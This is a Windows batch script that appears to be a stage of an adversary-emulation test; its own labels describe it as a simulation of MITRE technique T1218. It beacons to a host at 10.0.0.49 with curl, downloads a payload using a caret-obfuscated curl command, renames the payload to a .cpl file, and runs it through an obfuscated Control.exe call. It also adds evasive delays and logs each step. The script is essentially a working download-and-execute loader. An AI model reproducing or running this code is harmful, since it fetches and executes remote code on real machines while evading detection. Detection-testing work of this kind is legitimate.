@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ constants (plain literals - NO escaping)
SET zxasdf=%APPDATA%\8518\ba75fdfc
SET qwetjy=Macula-Stage0-8518
SET poikgf=https://10.0.0.49
SET bvcxhg=https://10.0.0.49/stage/2/icon.png?8518-7
SET mkjhgf=BALAM-S2BO
SET zxcvbn=7
SET poiuyy=winword.txt
SET lkjhgb=8518

REM Derived variables
SET logdir=%APPDATA%\!zxcvbn!
SET logfile=!logdir!\macula-simulations.log
SET outdir=!zxasdf!
SET agentname=!mkjhgf!
SET endpointid=!zxcvbn!
SET simid=!lkjhgb!

REM Create log directory
if not exist "!logdir!" mkdir "!logdir!" >nul 2>nul

REM Initial delay 30-60s
echo [%DATE% %TIME%][DEBUG][!agentname!]: initial_delay_start>> "!logfile!" 2>nul
ping -n 45 127.0.0.1 >nul
echo [%DATE% %TIME%][DEBUG][!agentname!]: initial_delay_complete>> "!logfile!" 2>nul

REM C2 Heartbeat (no obfuscation for curl)
echo [%DATE% %TIME%][DEBUG][!agentname!]: heartbeat_start>> "!logfile!" 2>nul
curl -k -s -o nul "!bvcxhg!"
echo [%DATE% %TIME%][DEBUG][!agentname!]: heartbeat_complete>> "!logfile!" 2>nul

REM Delay between operations
echo [%DATE% %TIME%][DEBUG][!agentname!]: intermediate_delay_start>> "!logfile!" 2>nul
timeout /t 10 /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!agentname!]: intermediate_delay_complete>> "!logfile!" 2>nul

REM Create output directory
echo [%DATE% %TIME%][DEBUG][!agentname!]: directory_creation_start=!outdir!>> "!logfile!" 2>nul
if not exist "!outdir!" mkdir "!outdir!" >nul 2>nul
echo [%DATE% %TIME%][DEBUG][!agentname!]: directory_creation_complete=!outdir!>> "!logfile!" 2>nul

REM Download DLL
echo [%DATE% %TIME%][DEBUG][!agentname!]: download_start=!poikgf!>> "!logfile!" 2>nul
SET dllurl=!poikgf!
SET outfile=!outdir!\!poiuyy!

REM Obfuscated curl download
SET cu1=c^u^r^l
SET cu2= -k -s
SET cu3= -o
SET cu4= "!outfile!"
SET cu5= "!dllurl!"
%cu1%%cu2%%cu3%%cu4%%cu5% >nul 2>nul
echo [%DATE% %TIME%][DEBUG][!agentname!]: download_complete=!outfile!>> "!logfile!" 2>nul

REM Random delay
SET /A randdelay=%RANDOM% %% 20 + 10
echo [%DATE% %TIME%][DEBUG][!agentname!]: random_delay_start=!randdelay!s>> "!logfile!" 2>nul
timeout /t !randdelay! /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!agentname!]: random_delay_complete>> "!logfile!" 2>nul

REM Rename to CPL
SET newcpl=!outdir!\file.cpl
echo [%DATE% %TIME%][DEBUG][!agentname!]: rename_start=!outfile!>> "!logfile!" 2>nul
move /Y "!outfile!" "!newcpl!" >nul 2>nul
echo [%DATE% %TIME%][DEBUG][!agentname!]: rename_complete=!newcpl!>> "!logfile!" 2>nul

REM Delay before execution
echo [%DATE% %TIME%][DEBUG][!agentname!]: pre_execution_delay_start>> "!logfile!" 2>nul
CHOICE /C Y /N /D Y /T 8 >nul
echo [%DATE% %TIME%][DEBUG][!agentname!]: pre_execution_delay_complete>> "!logfile!" 2>nul

REM Execute Control.exe with obfuscated command
SET res=0
SET err=
echo [%DATE% %TIME%][DEBUG][!agentname!]: execution_start=!newcpl!>> "!logfile!" 2>nul

REM Obfuscated Control.exe
SET c1=C^o^n^t^r^o^l
SET c2=^.e^x^e
SET c3= "!newcpl!"
!c1!!c2!!c3!
if !errorlevel! equ 0 (
    SET res=1
    SET err=
) else (
    SET err=control_failed_!errorlevel!
)

REM TTP logging for T1218
SET ttpid=T1218
SET ttpname=Signed Binary Proxy Execution
SET ts=%DATE:~10,4%-%DATE:~4,2%-%DATE:~7,2% %TIME:~0,2%:%TIME:~3,2%:%TIME:~6,2%.%TIME:~9,3%
SET ts=!ts: =0!
echo [!ts!][!agentname!]: !endpointid!-!simid!-!ttpid!|!ttpname!=!res!:!err!>> "!logfile!" 2>nul

echo [%DATE% %TIME%][DEBUG][!agentname!]: execution_complete=result_!res!>> "!logfile!" 2>nul

REM Final delay and cleanup
echo [%DATE% %TIME%][DEBUG][!agentname!]: final_delay_start>> "!logfile!" 2>nul
ping -n 12 127.0.0.1 >nul
echo [%DATE% %TIME%][DEBUG][!agentname!]: final_delay_complete>> "!logfile!" 2>nul

REM Cleanup (optional)
REM del "!newcpl!" >nul 2>nul
REM rmdir "!outdir!" >nul 2>nul

ENDLOCAL